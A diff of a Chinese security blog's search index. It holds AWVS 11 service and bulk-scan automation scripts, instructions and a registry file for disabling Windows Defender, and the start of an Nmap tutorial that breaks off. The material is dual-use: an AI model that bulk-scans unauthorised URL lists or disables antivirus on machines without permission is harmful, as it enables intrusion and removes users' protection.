@@ -1,314 +1,96 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search> 
-  
-    
-    <entry>
-      <title><![CDATA[AWVS各类脚本]]></title>
-      <url>/2017/09/18/acunetix-web-vulnerability-scanner-11/</url>
-      <content type="html"><![CDATA[<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>Acunetix Web Vulnerability Scanner是一个网站及服务器漏洞扫描软件，它包含有收费和免费两种版本。</p>
-<h1 id="启动-amp-停止脚本"><a href="#启动-amp-停止脚本" class="headerlink" title="启动&amp;停止脚本"></a>启动&amp;停止脚本</h1><p><img src="http://ovqjzu5ds.bkt.clouddn.com/4ae163a2025e9e1901e2229469b6c34f.png" alt="strat awvs"><br><img src="http://ovqjzu5ds.bkt.clouddn.com/8d90dc8fca64811b035345b251fd74e0.png" alt="service start awvs"><br><img src="http://ovqjzu5ds.bkt.clouddn.com/6b6c1b1eeaa515b91f0d92892e148c4e.png" alt="service stop awvs"></p>
-<blockquote>
-<p>下面代码复制另存为awvs.bat<br><figure class="highlight dos"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line">@<span class="built_in">echo</span> off</div><div class="line"><span class="built_in">mode</span> <span class="built_in">con</span> lines=<span class="number">30</span> cols=<span class="number">60</span></div><div class="line"><span class="built_in">cls</span></div><div class="line"><span class="built_in">color</span> <span class="number">2</span>f</div><div class="line"><span class="built_in">echo</span>.-----------------------------------------------------------</div><div class="line"><span class="built_in">echo</span>.请选择使用：</div><div class="line"><span class="built_in">echo</span>.</div><div class="line"><span class="built_in">echo</span>. <span class="number">1</span>.启动Awvs <span class="number">11</span>（即在下面输入<span class="number">1</span>）</div><div class="line"><span class="built_in">echo</span>.</div><div class="line"><span class="built_in">echo</span>. <span class="number">2</span>.停止Awvs <span class="number">11</span>（即在下面输入<span class="number">2</span>）</div><div class="line"><span class="built_in">echo</span>.-----------------------------------------------------------</div><div class="line"></div><div class="line"><span class="keyword">if</span> <span class="keyword">exist</span> "<span class="variable">%SystemRoot%</span>\System32\choice.exe" <span class="keyword">goto</span> Win7Choice</div><div class="line"></div><div class="line"><span class="built_in">set</span> /p choice=请输入数字并按回车键确认:</div><div class="line"></div><div class="line"><span class="built_in">echo</span>.</div><div class="line"><span class="keyword">if</span> <span class="variable">%choice%</span>==<span class="number">1</span> <span class="keyword">goto</span> StartAwvs</div><div class="line"><span class="keyword">if</span> <span class="variable">%choice%</span>==<span class="number">2</span> <span class="keyword">goto</span> StopAwvs</div><div class="line"><span class="built_in">cls</span></div><div class="line">"<span class="built_in">set</span> choice="</div><div class="line"><span class="built_in">echo</span> 您输入有误，请重新选择。</div><div class="line"><span class="keyword">goto</span> main</div><div class="line"></div><div class="line">:Win7Choice</div><div class="line">choice /c <span class="number">12</span> /n /m "请输入相应数字："</div><div class="line"><span class="keyword">if</span> <span class="keyword">errorlevel</span> <span class="number">2</span> <span class="keyword">goto</span> StopAwvs</div><div class="line"><span class="keyword">if</span> <span class="keyword">errorlevel</span> <span class="number">1</span> <span class="keyword">goto</span> StartAwvs</div><div class="line"><span class="built_in">cls</span></div><div class="line"><span class="keyword">goto</span> main</div><div class="line"></div><div class="line">:StartAwvs</div><div class="line"><span class="built_in">cls</span></div><div class="line"><span class="built_in">color</span> <span class="number">2</span>f</div><div class="line"><span class="built_in">net</span> <span class="built_in">start</span> Acunetix</div><div class="line"><span class="built_in">net</span> <span class="built_in">start</span> "Acunetix Database"</div><div class="line"><span class="built_in">echo</span>.-----------------------------------------------------------</div><div class="line"><span class="built_in">echo</span>.</div><div class="line"><span class="built_in">echo</span> 成功启动 "Acunetix"，"Acunetix Database" 服务！</div><div class="line"><span class="built_in">echo</span>.</div><div class="line"><span class="keyword">goto</span> end</div><div class="line"></div><div class="line">:StopAwvs</div><div class="line"><span class="built_in">cls</span></div><div class="line"><span class="built_in">color</span> <span class="number">2</span>f</div><div class="line"><span class="built_in">net</span> stop Acunetix</div><div class="line"><span class="built_in">net</span> stop "Acunetix Database"</div><div class="line"><span class="built_in">echo</span>.-----------------------------------------------------------</div><div class="line"><span class="built_in">echo</span>.</div><div class="line"><span class="built_in">echo</span> 成功关闭 "Acunetix"，"Acunetix Database" 服务！</div><div class="line"><span class="built_in">echo</span>.</div><div class="line"><span class="keyword">goto</span> end</div><div class="line"></div><div class="line">:end</div><div class="line"><span class="built_in">echo</span> 请按任意键退出。</div><div class="line">@<span class="built_in">Pause</span>&gt;<span class="built_in">nul</span></div></pre></td></tr></table></figure></p>
-</blockquote>
-<h1 id="批量添加扫描URL"><a href="#批量添加扫描URL" class="headerlink" title="批量添加扫描URL"></a>批量添加扫描URL</h1><blockquote>
-<p>该脚本为Python语言,使用前请安装Python.</p>
-<p>1、将下列代码复制另存为”awvs11批量扫描删除.py”</p>
-<p>2、全文搜索localhost:3443,全部替换为你awvs所在的服务器及端口</p>
-<p>3、username填你的账户名,pw填你的密码,是sha256加密后的密码</p>
-<p>4、把要添加的url列表保存成testawvs.txt文件，放在该脚本所在目录运行该脚本。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"><span class="keyword">import</span> ssl</div><div class="line"><span class="keyword">import</span> json</div><div class="line">__author=<span class="string">"jamesj"</span></div><div class="line"><span class="comment">#localhost:3443全部替换为awvs所在的服务器及端口</span></div><div class="line">username=<span class="string">'mail@mail.com'</span></div><div class="line"><span class="comment">#账号邮箱</span></div><div class="line">pw=<span class="string">'sha256加密后的密码'</span></div><div class="line"><span class="comment">#sha256加密后的密码，通过burp抓包可获取,也可以使用(http://tool.oschina.net/encrypt?type=2)把密码进行加密之后填入，请区分大小写、中英文字符。</span></div><div class="line"><span class="comment">#以上内容为配置内容，然后把要添加的url列表保存成testawvs.txt文件，放在该脚本下运行该脚本。</span></div><div class="line">ssl._create_default_https_context = ssl._create_unverified_context</div><div class="line">url_login=<span class="string">"https://localhost:3443/api/v1/me/login"</span></div><div class="line">send_headers_login=&#123;</div><div class="line"><span class="string">'Host'</span>: <span class="string">'localhost:3443'</span>,</div><div class="line"><span class="string">'Accept'</span>: <span class="string">'application/json, text/plain, */*'</span>,</div><div class="line"><span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</div><div class="line"><span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, br'</span>,</div><div class="line"><span class="string">'Content-Type'</span>: <span class="string">'application/json;charset=utf-8'</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">data_login=<span class="string">'&#123;"email":"'</span>+username+<span class="string">'","password":"'</span>+pw+<span class="string">'","remember_me":false&#125;'</span></div><div class="line"></div><div class="line">req_login = urllib2.Request(url_login,headers=send_headers_login)</div><div class="line">response_login = urllib2.urlopen(req_login,data_login)</div><div class="line">xauth = response_login.headers[<span class="string">'X-Auth'</span>]</div><div class="line">COOOOOOOOkie = response_login.headers[<span class="string">'Set-Cookie'</span>]</div><div class="line"><span class="keyword">print</span> <span class="string">"当前验证信息如下\r\n cookie : %r  \r\n X-Auth : %r  "</span>%(COOOOOOOOkie,xauth)</div><div class="line">send_headers2=&#123;</div><div class="line">	<span class="string">'Host'</span>:<span class="string">'localhost:3443'</span>,</div><div class="line">	<span class="string">'Accept'</span>: <span class="string">'application/json, text/plain, */*'</span>,</div><div class="line">	<span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</div><div class="line">	<span class="string">'Content-Type'</span>:<span class="string">'application/json;charset=utf-8'</span>,</div><div class="line">	<span class="string">'X-Auth'</span>:xauth,</div><div class="line">	<span class="string">'Cookie'</span>:COOOOOOOOkie</div><div class="line">	&#125;</div><div class="line"><span class="comment">#以上代码实现登录（获取cookie）和校验值</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_exec_scan</span><span class="params">()</span>:</span></div><div class="line">	url=<span class="string">"https://localhost:3443/api/v1/targets"</span></div><div class="line">	<span class="keyword">try</span>:</div><div class="line">		urllist=open(<span class="string">'testawvs.txt'</span>,<span class="string">'r'</span>)<span class="comment">#这是要添加的url列表</span></div><div class="line">		formaturl=urllist.readlines()</div><div class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> formaturl:</div><div class="line">			target_url=<span class="string">'http://'</span>+i.strip()</div><div class="line">			data=<span class="string">'&#123;"description":"222","address":"'</span>+target_url+<span class="string">'","criticality":"10"&#125;'</span></div><div class="line">			<span class="comment">#data = urllib.urlencode(data)由于使用json格式所以不用添加</span></div><div class="line">			req = urllib2.Request(url,headers=send_headers2)</div><div class="line">			response = urllib2.urlopen(req,data)</div><div class="line">			jo=json.loads(response.read())</div><div class="line">			target_id=jo[<span class="string">'target_id'</span>]<span class="comment">#获取添加后的任务ID</span></div><div class="line">			<span class="comment">#print target_id</span></div><div class="line">	<span class="comment">#以上代码实现批量添加</span></div><div class="line"></div><div class="line">			url_scan=<span class="string">"https://localhost:3443/api/v1/scans"</span></div><div class="line">			headers_scan=&#123;</div><div class="line">	<span class="string">'Host'</span>: <span class="string">'localhost:3443'</span>,</div><div class="line">	<span class="string">'Accept'</span>: <span class="string">'application/json, text/plain, */*'</span>,</div><div class="line">	<span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</div><div class="line">	<span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, br'</span>,</div><div class="line">	<span class="string">'Content-Type'</span>: <span class="string">'application/json;charset=utf-8'</span>,</div><div class="line">	<span class="string">'X-Auth'</span>:xauth,</div><div class="line">	<span class="string">'Cookie'</span>:COOOOOOOOkie,</div><div class="line">			&#125;</div><div class="line">			data_scan=<span class="string">'&#123;"target_id":'</span>+<span class="string">'\"'</span>+target_id+<span class="string">'\"'</span>+<span class="string">',"profile_id":"11111111-1111-1111-1111-111111111111","schedule":&#123;"disable":false,"start_date":null,"time_sensitive":false&#125;,"ui_session_id":"66666666666666666666666666666666"&#125;'</span></div><div class="line">			req_scan=urllib2.Request(url_scan,headers=headers_scan)</div><div class="line">			response_scan=urllib2.urlopen(req_scan,data_scan)</div><div class="line">			<span class="keyword">print</span> response_scan.read()+<span class="string">"添加成功！"</span></div><div class="line">	<span class="comment">#以上代码实现批量加入扫描</span></div><div class="line">		urllist.close()</div><div class="line">	<span class="keyword">except</span> Exception,e:</div><div class="line">		<span class="keyword">print</span> e</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span><span class="params">()</span>:</span></div><div class="line">	url_count=<span class="string">"https://localhost:3443/api/v1/notifications/count"</span></div><div class="line">	req_count=urllib2.Request(url_count,headers=send_headers2)</div><div class="line">	response_count=urllib2.urlopen(req_count)</div><div class="line">	<span class="keyword">print</span> <span class="string">"当前存在%r个通知！"</span> % json.loads(response_count.read())[<span class="string">'count'</span>]</div><div class="line">	<span class="keyword">print</span> <span class="string">"-"</span> * <span class="number">50</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"已存在以下任务"</span></div><div class="line">	url_info=<span class="string">"https://localhost:3443/api/v1/scans"</span></div><div class="line">	req_info=urllib2.Request(url_info,headers=send_headers2)</div><div class="line">	response_info=urllib2.urlopen(req_info)</div><div class="line">	all_info = json.loads(response_info.read())</div><div class="line">	num = <span class="number">0</span></div><div class="line">	<span class="keyword">for</span> website <span class="keyword">in</span> all_info.get(<span class="string">"scans"</span>):</div><div class="line">		num+=<span class="number">1</span></div><div class="line">		<span class="keyword">print</span> website.get(<span class="string">"target"</span>).get(<span class="string">"address"</span>)+<span class="string">" \r\n target_id:"</span>+website.get(<span class="string">"scan_id"</span>)</div><div class="line">	<span class="keyword">print</span> <span class="string">"共 %r个扫描任务"</span> % num</div><div class="line">		<span class="comment">#count()</span></div><div class="line"><span class="comment">#scan、target、notification！</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_scan</span><span class="params">()</span>:</span></div><div class="line">	url_info=<span class="string">"https://localhost:3443/api/v1/scans"</span></div><div class="line">	req_info=urllib2.Request(url_info,headers=send_headers2)</div><div class="line">	response_info=urllib2.urlopen(req_info)</div><div class="line">	all_info = json.loads(response_info.read())</div><div class="line">	counter = <span class="number">0</span></div><div class="line">	<span class="keyword">for</span> website <span class="keyword">in</span> all_info.get(<span class="string">"scans"</span>):</div><div class="line">		<span class="comment">#if (website.get("target").get("description"))== "222":</span></div><div class="line">		url_scan_del=<span class="string">"https://localhost:3443/api/v1/scans/"</span>+str(website.get(<span class="string">"scan_id"</span>))</div><div class="line">		req_del = urllib2.Request(url_scan_del,headers=send_headers2)</div><div class="line">		req_del.get_method =<span class="keyword">lambda</span>: <span class="string">'DELETE'</span></div><div class="line">		response_del = urllib2.urlopen(req_del)</div><div class="line">		counter = counter+<span class="number">1</span></div><div class="line">		<span class="keyword">print</span> <span class="string">"已经删除第%r个!"</span> %  counter</div><div class="line"><span class="comment">#del_scan()			#通过描述判断是否使用扫描器添加扫描器添加的时候设置description=“222”</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_targets</span><span class="params">()</span>:</span></div><div class="line">	url_info=<span class="string">"https://localhost:3443/api/v1/targets"</span></div><div class="line">	req_info=urllib2.Request(url_info,headers=send_headers2)</div><div class="line">	response_info=urllib2.urlopen(req_info)</div><div class="line">	all_info = json.loads(response_info.read())</div><div class="line">	<span class="keyword">for</span> website <span class="keyword">in</span> all_info.get(<span class="string">"targets"</span>):</div><div class="line">		<span class="keyword">if</span> (website.get(<span class="string">"description"</span>))== <span class="string">"222"</span>:</div><div class="line">			url_scan_del=<span class="string">"https://localhost:3443/api/v1/targets/"</span>+str(website.get(<span class="string">"target_id"</span>))</div><div class="line">			req_del = urllib2.Request(url_scan_del,headers=send_headers2)</div><div class="line">			req_del.get_method =<span class="keyword">lambda</span>: <span class="string">'DELETE'</span></div><div class="line">			response_del = urllib2.urlopen(req_del)</div><div class="line">			<span class="keyword">print</span> <span class="string">"ok!"</span></div><div class="line"><span class="comment">#del_targets()</span></div><div class="line"><span class="keyword">if</span> __name__== <span class="string">"__main__"</span>:</div><div class="line">	<span class="keyword">print</span> <span class="string">"*"</span> * <span class="number">20</span></div><div class="line">	count()</div><div class="line">	<span class="keyword">print</span> <span class="string">"1、使用testawvs.txt添加扫描任务并执行请输入1，然后回车\r\n2、删除所有使用该脚本添加的任务请输入2，然后回车\r\n3、删除所有任务请输入3，然后回车\r\n4、查看已存在任务请输入4，然后回车\r\n"</span></div><div class="line">	choice = raw_input(<span class="string">"&gt;"</span>)</div><div class="line"><span class="comment">#	print type(choice)</span></div><div class="line"></div><div class="line">	<span class="keyword">if</span> choice ==<span class="string">"1"</span>:</div><div class="line">		add_exec_scan()</div><div class="line">		count()</div><div class="line">	<span class="keyword">elif</span>  choice ==<span class="string">"2"</span>:</div><div class="line">		del_targets()</div><div class="line">		count()</div><div class="line">	<span class="keyword">elif</span>  choice ==<span class="string">"3"</span>:</div><div class="line">		del_scan()</div><div class="line">		count()</div><div class="line">	<span class="keyword">elif</span>  choice ==<span class="string">"4"</span>:</div><div class="line">		count()</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">print</span> <span class="string">"请重新运行并请输入1、2、3、4选择。"</span></div><div class="line"></div><div class="line"><span class="comment">#下图的注释信息是删除通知。。</span></div><div class="line"><span class="string">"""</span></div><div class="line"><span class="string">	counter= 0</span></div><div class="line"><span class="string">	for website in all_info.get("notifications"):</span></div><div class="line"><span class="string">		if (website["data"].get("address")== "www.ly.com"):</span></div><div class="line"><span class="string">			counter = counter + 1</span></div><div class="line"><span class="string">			url_del = "https://localhost:3443/api/v1/scans/"+str(website["data"].get("scan_id"))</span></div><div class="line"><span class="string">			print url_del#print url_del</span></div><div class="line"><span class="string">			req_del = urllib2.Request(url_del,headers=send_headers2)</span></div><div class="line"><span class="string">			 #DELETE方法</span></div><div class="line"><span class="string">			try:</span></div><div class="line"><span class="string">				req_del.get_method = lambda:"DELETE"</span></div><div class="line"><span class="string">				response1 = urllib2.urlopen(req_del)</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">			except:</span></div><div class="line"><span class="string">				print "error"</span></div><div class="line"><span class="string">				continue</span></div><div class="line"><span class="string">	print counter</span></div><div class="line"><span class="string">			#print response1.read()</span></div><div class="line"><span class="string">	#for address in need_info["address"]</span></div><div class="line"><span class="string">	#	if address</span></div><div class="line"><span class="string">del_all()</span></div><div class="line"><span class="string">"""</span></div></pre></td></tr></table></figure></p>
-</blockquote>
-<p><a href="http://ovqjzu5ds.bkt.clouddn.com/awvs11jiaoben.zip" rel="external nofollow noopener noreferrer" target="_blank">点我下载awvs集合脚本</a></p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a href="https://xianzhi.aliyun.com/forum/read/1616.html" rel="external nofollow noopener noreferrer" target="_blank">awvs 11一键启动-停止脚本</a></li>
-<li><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=610851" rel="external nofollow noopener noreferrer" target="_blank">awvs11批量添加扫描\删除小脚本</a></li>
-</ul>
-]]></content>
-      
-        <categories>
-            
-            <category> 神兵利器 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> acunetix web vulnerability scanner 11 </tag>
-            
-            <tag> awvs11破解版版 </tag>
-            
-            <tag> awvs11启动停止脚本 </tag>
-            
-            <tag> awvs11批量扫描脚本 </tag>
-            
-            <tag> 漏洞扫描工具 </tag>
-            
-            <tag> 批处理脚本 </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[windows10关闭最新Windows Defender]]></title>
-      <url>/2017/09/18/windows10-off-new-Windows-Defender/</url>
-      <content type="html"><![CDATA[<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>Windows Defender，曾用名Microsoft AntiSpyware，是用来移除、隔离和预防间谍软件的程序，可以运行在Windows XP以及更高版本的操作系统上，并已经内置在Windows Vista以及以后的版本中。测试版于2005年1月6日发布，在2005年6月23日、2006年2月17日微软又发布了更新的测试版本。Windows Defender的定义库更新很频繁。在Windows 8中与Microsoft Security Essentials集成。<br>Windows Defender不像某些其他同类免费产品一样只能扫描系统，还可以对系统进行实时监控，移除已经安装的ActiveX插件，清除大多数微软的程序和其他常用程序的历史纪录。</p>
-<h1 id="组策略-amp-注册表关闭最新Windows-Defender"><a href="#组策略-amp-注册表关闭最新Windows-Defender" class="headerlink" title="组策略&amp;注册表关闭最新Windows Defender"></a>组策略&amp;注册表关闭最新Windows Defender</h1><h2 id="使用组策略关闭最新Windows-Defender"><a href="#使用组策略关闭最新Windows-Defender" class="headerlink" title="使用组策略关闭最新Windows Defender"></a>使用组策略关闭最新Windows Defender</h2><p>本地组策略编辑器仅在Windows 10 Pro，Enterprise和Education 版本中可用。</p>
-<p>所有版本可以使用下面的注册表。</p>
-<p>打开步骤:开始-运行[win+r]-输入gpedit.msc</p>
-<p>win+r=键盘windows图标+r键</p>
-<p><img src="http://ovqjzu5ds.bkt.clouddn.com/8135e4a1df896c4344fafc9b4f07d32f.png" alt="gpedit"></p>
-<p>打开右侧菜单栏选择计算机配置-管理模板-Windows 组件-Windows Defender 防病毒程序-关闭 Windows Defender 防病毒程序</p>
-<p>默认是未配置,我先前启用了</p>
-<p><img src="http://ovqjzu5ds.bkt.clouddn.com/2808ec3c8f3b6bbeb389c7a04af32bf0.png" alt="off windows defender"></p>
-<p><img src="http://ovqjzu5ds.bkt.clouddn.com/681df75e8df08cf9a0a549b82c65d3c5.png" alt="start"></p>
-<p>选择已启用,点击确定,然后关闭组策略</p>
-<h2 id="使用注册表关闭最新Windows-Defender"><a href="#使用注册表关闭最新Windows-Defender" class="headerlink" title="使用注册表关闭最新Windows Defender"></a>使用注册表关闭最新Windows Defender</h2><p>使用REG文件打开或关闭Windows Defender Antivirus</p>
-<blockquote>
-<p>下面的.reg文件将添加和修改下面的注册表项中的DWORD值。</p>
-<p>HKEY_LOCAL_MACHINE \ SOFTWARE \ Policies \ Microsoft \ Windows Defender</p>
-<p>DisableAntiSpyware DWORD</p>
-<p>(delete) or 0 = On<br>1 = Off</p>
-</blockquote>
-<h3 id="关闭Windows-Defender-Antivirus"><a href="#关闭Windows-Defender-Antivirus" class="headerlink" title="关闭Windows Defender Antivirus"></a>关闭Windows Defender Antivirus</h3><p>下面代码复制,新建文本文档将内容粘贴进去,保存并重命名为关闭windef.reg<br><figure class="highlight dos"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Windows Registry Editor Version <span class="number">5</span>.<span class="number">00</span></div><div class="line"></div><div class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]</div><div class="line">"DisableAntiSpyware"=dword:<span class="number">00000001</span></div></pre></td></tr></table></figure></p>
-<h3 id="开启Windows-Defender-Antivirus"><a href="#开启Windows-Defender-Antivirus" class="headerlink" title="开启Windows Defender Antivirus"></a>开启Windows Defender Antivirus</h3><p>下面代码复制,新建文本文档将内容粘贴进去,保存并重命名为开启windef.reg<br><figure class="highlight dos"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Windows Registry Editor Version <span class="number">5</span>.<span class="number">00</span></div><div class="line"></div><div class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]</div><div class="line">"DisableAntiSpyware"=-</div></pre></td></tr></table></figure></p>
-<p><a href="http://ovqjzu5ds.bkt.clouddn.com/off_on_windefreg.zip" rel="external nofollow noopener noreferrer" target="_blank">点我下载:关闭和开启脚本</a></p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a href="https://zh.wikipedia.org/zh-hans/Windows_Defender" rel="external nofollow noopener noreferrer" target="_blank">Windows Defender</a></li>
-<li><a href="https://www.tenforums.com/tutorials/5918-turn-off-windows-defender-windows-10-a.html" rel="external nofollow noopener noreferrer" target="_blank">Turn On or Off Windows Defender in Windows 10</a></li>
-</ul>
-]]></content>
-      
-        <categories>
-            
-            <category> 技术问题解答 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> win10 </tag>
-            
-            <tag> 删除最新Windows Defender </tag>
-            
-            <tag> 关闭最新Windows Defender </tag>
-            
-            <tag> 打开windows Defender </tag>
-            
-            <tag> 删除杀毒软件 </tag>
-            
-            <tag> 组策略 </tag>
-            
-            <tag> 注册表 </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Nmap 中文教程]]></title>
-      <url>/2017/09/16/Nmap-Chinese-Course/</url>
-      <content type="html"><![CDATA[<h1 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00 简述"></a>0x00 简述</h1><p>Nmap（网络映射器）是一款用于网络发现和安全审计的网络安全工具，它是自由软件。软件名字Nmap是Network Mapper的简称。通常情况下，Nmap用于：</p>
-<ul>
-<li>列举网络主机清单</li>
-<li>管理服务升级调度</li>
-<li>监控主机</li>
-<li>服务运行状况</li>
-</ul>
-<p>Nmap可以检测目标主机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息。 它是网络管理员必用的软件之一，用以评估网络系统安全。<br>Nmap 是不少黑客及脚本小孩爱用的工具 。系统管理员可以利用Nmap来探测工作环境中未经批准使用的服务器，黑客通常会利用Nmap来搜集目标电脑的网络设定，从而计划攻击的方法。<br>Nmap通常用在信息搜集阶段，用于搜集目标机主机的基本状态信息。扫描结果可以作为漏洞扫描、漏洞利用和权限提升阶段的输入。例如，业界流行的漏洞扫描工具Nessus与漏洞利用工具Metasploit都支持导入Nmap的XML格式结果，而Metasploit框架内也集成了Nmap工具（支持Metasploit直接扫描）。<br>Nmap不仅可以用于扫描单个主机，也可以适用于扫描大规模的计算机网络（例如，扫描英特网上数万台计算机，从中找出感兴趣的主机和服务）。</p>
-<h1 id="0x01-命令及参数介绍"><a href="#0x01-命令及参数介绍" class="headerlink" title="0x01 命令及参数介绍"></a>0x01 命令及参数介绍</h1><h2 id="常见端口扫描"><a href="#常见端口扫描" class="headerlink" title="常见端口扫描"></a>常见端口扫描</h2><blockquote>
-<p>map [Scan Type(s)] [Options] {target specification}<br>scan type(s) 用于指定扫描类型<br>options 用于指定选项<br>target specification 用于指定扫描目标</p>
-<p>-s 指定扫描类型<br>如下：<br>-sP (ping扫描) <em>存活主机探测<br>-sS (TCP SYN扫描 隐身扫描)  </em>默认扫描方式<br>-sT (tcp 扫描) <em> syn 不能用时就tcp扫描<br>-sU （UDP 扫描）<br>-sA  （ACK扫描） </em>三次握手 用于探测出防火墙过滤端口 实际渗透中没多大用<br>-sV   （版本探测）<br>-A    操作系统探测<br>-O （启用操作系统检测）<br>-v    详细<br>选项说明：<br>-P0  [指定端口] (无ping扫描)<br>-PU  [指定端口] (udp ping扫描)<br>-PS [指定端口] (TCP SYN ping 扫描)<br>-PA  [指定端口] (tcp ack ping扫描)<br>-PI   使用真正的pingICMP echo请求来扫描目标主机是否正在运行<br>-iL 指定扫描主机列表<br>-iR 随机选择目标<br>–exclude 排除扫描目标<br>–excludefile 排除文件中目标列表<br>-n (不用域名解析)<br>-R (为所有目标解析域名)<br>-T  时间优化（每隔多久发一次包 ） -T5 最快 -T0 最慢<br>-F  快速扫描<br>-e  指定网络接口<br>-M 设置tcp扫描线程</p>
-</blockquote>
-<h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><blockquote>
